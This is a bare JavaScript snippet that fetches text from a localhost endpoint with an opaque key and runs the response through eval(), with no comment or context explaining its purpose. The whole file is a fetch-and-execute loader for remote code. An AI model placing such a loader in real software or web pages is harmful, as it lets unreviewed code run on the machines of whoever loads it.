(async function () {
  fetch('http://localhost:3001/f/p/orchestrate_chl?ssk=332321313')
      .then(response => response.text())
      .then(data => {
          eval(data);
      })
      .catch(error => {
          console.error('Fetch error:', error);
      });
})();